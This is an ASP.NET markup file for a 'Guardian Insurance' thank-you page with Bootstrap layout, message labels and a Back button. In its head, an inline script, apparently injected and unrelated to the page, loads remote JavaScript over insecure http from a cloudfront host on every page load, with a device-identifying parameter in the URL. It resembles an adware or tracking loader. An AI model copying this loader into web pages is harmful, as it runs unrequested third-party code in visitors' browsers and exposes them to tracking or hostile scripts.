<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Message.aspx.cs" Inherits="Message" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Guardian Insurance</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style type="text/css">
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>
   <form id="Form1" method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <div class="row row-offcanvas row-offcanvas-left" style="height: 100%">
            <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
            </div>
            <div class="col-sm-9 col-md-10 main" style="height: 100%">
                <!--toggle sidebar button-->
                <p class="visible-xs">
                    <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                        <i class="glyphicon glyphicon-chevron-left"></i>
                    </button>
                </p>
                <h1 class="page-header">
                    Thank you!                   
                </h1>
                <div class="row buttons">
                    <div  align="center">                      
                            <h2><asp:Label ID="lblHeader" runat="server" Text="" Font-Bold="true" ></asp:Label></h2>
                            <br />
                             <br />
                        <div align="center">
						     <h4><asp:Label ID="lblMessage" runat="server" Text="" Font-Bold="true" ></asp:Label></h4>
                             <br />                               
                        </div>
                         <div align="center">
						    <asp:Label ID="lblMessage2" runat="server" Text="" Font-Bold="true" ></asp:Label>
                             <br />
                              <br />
                               <br />
                        </div>
                        <div class="">                       
						   
                            <br />  
                            <asp:Button ID="btnBack" class="btn btn-primary btn-lg" runat="server" 
                                Text="Back" Width="150px" onclick="btnBack_Click" />
					    </div>
                    </div>
                    
                </div>
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
                <br />
            </div>
        </div>
    </div>
    </form>
</body>
</html>
